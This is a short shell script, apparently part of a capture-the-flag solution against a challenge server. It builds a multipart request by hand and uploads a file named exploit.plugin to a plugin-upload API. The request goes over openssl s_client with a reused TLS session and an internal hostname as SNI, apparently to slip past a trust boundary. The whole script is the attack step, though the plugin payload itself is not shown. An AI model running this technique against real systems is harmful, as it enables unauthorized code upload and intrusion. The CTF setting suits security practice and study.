BOUNDARY="------------------------boundary123"

echo -e "--$BOUNDARY\r\nContent-Disposition: form-data; name=\"plugin\"; filename=\"exploit.plugin\"\r\nContent-Type: application/octet-stream\r\n\r" > body.bin
cat exploit.plugin >> body.bin
echo -e "\r\n--$BOUNDARY--\r" >> body.bin

LEN=$(wc -c < body.bin)

(
  echo -e "POST /api/plugins/upload HTTP/1.1\r"
  echo -e "Host: employee.trustboundary.local\r"
  echo -e "Content-Type: multipart/form-data; boundary=$BOUNDARY\r"
  echo -e "Content-Length: $LEN\r"
  echo -e "\r"
  cat body.bin
) | openssl s_client -connect challenge.cnsc.com.vn:31507 -servername employee.trustboundary.local -sess_in session.pem -quiet
